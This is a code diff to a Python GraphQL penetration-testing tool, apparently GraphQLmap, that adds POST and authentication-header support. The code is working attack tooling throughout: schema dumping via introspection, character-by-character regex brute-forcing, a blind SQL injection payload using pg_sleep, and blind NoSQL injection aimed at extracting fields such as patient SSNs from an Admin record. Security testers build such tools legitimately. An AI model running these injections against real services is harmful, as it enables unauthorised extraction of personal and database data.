@@ -20,19 +20,23 @@ def auto_completer(text, state):
 def jq(data):
     return json.dumps(data, indent=4, sort_keys=True)
 
-def display_types(URL):
-    payload = "{__schema{types{name}}}"
+# def display_types(URL):
+#     payload = "{__schema{types{name}}}"
+#
+#     r = requests.get( URL.format(payload) )
+#     schema = r.json()
+#
+#     for names in schema['data']['__schema']['types']:
+#         print(names)
 
-    r = requests.get( URL.format(payload) )
-    schema = r.json()
-
-    for names in schema['data']['__schema']['types']:
-        print(names)
-
-def dump_schema(URL):
+def dump_schema(URL, method, auth):
     payload = "fragment+FullType+on+__Type+{++kind++name++description++fields(includeDeprecated%3a+true)+{++++name++++description++++args+{++++++...InputValue++++}++++type+{++++++...TypeRef++++}++++isDeprecated++++deprecationReason++}++inputFields+{++++...InputValue++}++interfaces+{++++...TypeRef++}++enumValues(includeDeprecated%3a+true)+{++++name++++description++++isDeprecated++++deprecationReason++}++possibleTypes+{++++...TypeRef++}}fragment+InputValue+on+__InputValue+{++name++description++type+{++++...TypeRef++}++defaultValue}fragment+TypeRef+on+__Type+{++kind++name++ofType+{++++kind++++name++++ofType+{++++++kind++++++name++++++ofType+{++++++++kind++++++++name++++++++ofType+{++++++++++kind++++++++++name++++++++++ofType+{++++++++++++kind++++++++++++name++++++++++++ofType+{++++++++++++++kind++++++++++++++name++++++++++++++ofType+{++++++++++++++++kind++++++++++++++++name++++++++++++++}++++++++++++}++++++++++}++++++++}++++++}++++}++}}query+IntrospectionQuery+{++__schema+{++++queryType+{++++++name++++}++++mutationType+{++++++name++++}++++types+{++++++...FullType++++}++++directives+{++++++name++++++description++++++locations++++++args+{++++++++...InputValue++++++}++++}++}}"
 
-    r = requests.get( URL.format(payload) )
+    if method == 'GET':
+        r = requests.get(URL.format(payload), headers=auth)
+    else:
+        payload = '{"query": "query IntrospectionQuery{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}"}'
+        r = requests.post(URL, json=json.loads(payload), headers=auth)
     schema = r.json()
     print("============= [SCHEMA] ===============")
     print("e.g: \033[92mname\033[0m[\033[94mType\033[0m]: arg (\033[93mType\033[0m!)\n")
@@ -77,8 +81,11 @@ def dump_schema(URL):
 
                     print("")
 
-def exec_graphql(URL, query, only_length=0):
-    r = requests.get( URL.format(query) )
+def exec_graphql(URL, query, method, auth, only_length=0):
+    if method == "GET":
+        r = requests.get( URL.format(query), headers=auth)
+    else:
+        r = requests.post(URL, json=json.loads(query),headers=auth )
     try:
         graphql = r.json()
         errors = graphql.get("errors")
@@ -106,13 +113,13 @@ def exec_graphql(URL, query, only_length=0):
     except Exception as e:
         return "\033[91m[!]\033[0m {}".format(str(e))
     
-def exec_advanced(URL, query):
+def exec_advanced(URL, query, method, auth):
     # Allow a user to bruteforce character from a charset
     # e.g: {doctors(options: 1, search: "{ \"lastName\": { \"$regex\": \"AdmiGRAPHQL_CHARSET\"} }"){firstName lastName id}}   
     if "GRAPHQL_CHARSET" in query:
         GRAPHQL_CHARSET = "!$%\'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[]^_`abcdefghijklmnopqrstuvwxyz{|}~"
         for c in GRAPHQL_CHARSET:
-            length = exec_graphql(URL, query.replace("GRAPHQL_CHARSET", c), only_length=1)
+            length = exec_graphql(URL, query.replace("GRAPHQL_CHARSET", c), method, auth,only_length=1)
             print("[+] \033[92mQuery\033[0m: (\033[91m{}\033[0m) {}".format(length, query.replace("GRAPHQL_CHARSET", c)))
 
 
@@ -124,23 +131,27 @@ def exec_advanced(URL, query):
 
         for i in range(int(match[0])):
             pattern = "GRAPHQL_INCREMENT_" + match[0]
-            length = exec_graphql(URL, query.replace(pattern, str(i)), only_length=1)
+            length = exec_graphql(URL, query.replace(pattern, str(i)), method, auth, only_length=1)
             print("[+] \033[92mQuery\033[0m: (\033[91m{}\033[0m) {}".format(length, query.replace(pattern, str(i))))
 
     # Otherwise execute the query and display the JSON result
     else:
-        print(exec_graphql(URL, query))
+        print(exec_graphql(URL, query, method, auth))
             
-def blind_sql(URL):
+def blind_sql(URL, method, auth):
     query = input("Query > ")
     payload = "1 AND pg_sleep(30) --"
     print("\033[92m[+] Started at: {}\033[0m".format(time.asctime( time.localtime(time.time()))))
-    injected = (URL.format(query)).replace("BLIND_PLACEHOLDER", payload)
-    r = requests.get(injected)
+    if method == "GET":
+        injected = (URL.format(query)).replace("BLIND_PLACEHOLDER", payload)
+        r = requests.get(injected, headers=auth)
+    else:
+        injected = query.replace("BLIND_PLACEHOLDER", payload)
+        r = requests.post(URL, json=json.loads(injected), headers=auth)
     print("\033[92m[+] Ended at: {}\033[0m".format(time.asctime( time.localtime(time.time()))))
 
 
-def blind_nosql(URL):
+def blind_nosql(URL, method, auth):
     # Query : {doctors(options: "{\"\"patients.ssn\":1}", search: "{ \"patients.ssn\": { \"$regex\": \"^BLIND_PLACEHOLDER\"}, \"lastName\":\"Admin\" , \"firstName\":\"Admin\" }"){id, firstName}}
     # Check : "5d089c51dcab2d0032fdd08d"
 
@@ -152,8 +163,13 @@ def blind_nosql(URL):
 
     while len(data) != data_size:
         for c in charset:
-            injected = (URL.format(query)).replace("BLIND_PLACEHOLDER", data + c)
-            r = requests.get(injected)
+            if method == "GET":
+                injected = (URL.format(query)).replace("BLIND_PLACEHOLDER", data + c)
+                r = requests.get(injected, headers=auth)
+            else:
+                injected = query.replace("BLIND_PLACEHOLDER", data + c)
+                print(injected)
+                r = requests.post(URL, json=json.loads(injected), headers=auth)
             if check in r.text:
                 data += c
 
@@ -183,8 +199,12 @@ def display_help():
 
 def parse_args():
     parser = argparse.ArgumentParser()
-    parser.add_argument('-u', action ='store', dest='url',       help="URL to query : example.com/graphql?query={}")
+    parser.add_argument('-u', action ='store', dest='url',       help="URL to query : example.com/graphql")
     parser.add_argument('-v', action ='store', dest='verbosity', help="Enable verbosity", nargs='?', const=True)
+    parser.add_argument('-m', dest='method', help="Set the HTTP method you want this tool to interact with the API",
+                        nargs='?', default='GET')
+    parser.add_argument('-a', dest='auth', help='Set authentication if needed. The format must be in key:value i.e. '
+                                                'header:value', default='')
     results = parser.parse_args() 
     if results.url == None:
         parser.print_help()
@@ -197,24 +217,28 @@ if __name__ == "__main__":
     args = parse_args()
     readline.set_completer(auto_completer)
     readline.parse_and_bind("tab: complete")
+    if args.auth is not None:
+        args.auth = json.loads('{"'+args.auth.split(':')[0]+'":"'+args.auth.split(':')[1]+'"}')
 
     while True:
         query = input("GraphQLmap > ")
         cmdlist.append(query)
         if query == "exit" or query == "q": 
             exit()
+        if args.method == 'GET':
+            args.url += '?query={}'
 
         elif query == "help":
             display_help()
 
         elif query == "dump":
-            dump_schema(args.url)
+            dump_schema(args.url, args.method, args.auth)
 
         elif query == "nosqli":
-            blind_nosql(args.url)
+            blind_nosql(args.url, args.method, args.auth)
 
         elif query == "sqli":
-            blind_sql(args.url)
+            blind_sql(args.url, args.method, args.auth)
 
         else:
-            exec_advanced(args.url, query)
+            exec_advanced(args.url, query, args.method, args.auth)
